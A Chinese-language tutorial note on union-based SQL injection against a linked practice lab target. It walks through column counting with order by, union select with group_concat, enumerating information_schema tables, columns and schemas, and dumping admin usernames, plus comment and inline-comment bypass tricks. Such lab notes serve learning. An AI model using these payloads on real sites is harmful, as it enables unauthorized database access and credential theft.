回显点就是查到的数据返回到页面前端上

[sql注入靶机链接](http://59.63.200.79:8003/)

### order by 

```
输入 1' order by 1#和 1' order by 2#时都返回正常：


order by.png

order by2.png
当输入 1' order by 3#时，返回错误：


order by3.png
由此可知，users表中只有两个字段，数据为两列。
```
### union 
 联合查询

 因为上面判断出了该表有多少个字段，联合查询差不多就是把union后面查询语句返回的值接到原表后面去，但是不能通过指针访问到，只能id大于原最大id才能访问到(ps.或者前面的查询语句不产生作用,判断语句结果值为False,and 1=2)
 union访问到的只能是返回的所有数据第一条

###  group_concat()



`group_concat`跟着上面的union用把返回的所有的`group_concat()`括号里的字段的数据全部拼接一个str


### 回显点
举例比如有时候你通过order by查询到该表有两个字段，但是显示到前端页面能看到的只有一个数据，比如前者 或者 后者，这样的话显示出来的那个就是回显点

---

## information_schema

当数据库版本大于5.5时，有一个数据库名为`information_schema`里面有该链接下所有数据库所有的信息，包括所有的字段名，表名。

##### tables:
tables为information_schema下的一个表，里面有所有的表的信息
通过：
```
union select table_name,table_schema from information_schema.tables where table_schema= 'user'
```


可以找到user数据库下所有的表名和所属的数据库



#### columns
columns是information下的一个表，里面有链接下所有的列(ps.也就是字段)的信息，
通过：
```
4 union select 1,group_concat(column_name) from information_schema.columns where table_name='admin' and table_schema='maoshe'
```
可以找到maoshe库里admin表里的所有字段，(ps.因为回显点在第二个，所以我第一个放1，也无所谓，因为不显示)


#### schemata
schemata是information下的一个表，里面保存的是每个数据库的一些信息
通过：

`union select 1,group_concat(schema_name) from information_schema.schemata`

---



## 查询表的数据时
==切记要记得加数据库名==

`?id=4 union select 1,group_concat(username) from maoshe.admin`

==上面是整形注入，字符型的差不多，就注意打断引号''就行了==

### 注释符：
在mysql中常见的注释符有：#或--空格或/**/
内联注释：
内联注释的形式;/*！code*/。内联注释可以用于整个SQL语句中，用于执行我们的SQl语句，下面举一个例子：
index.php?id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3







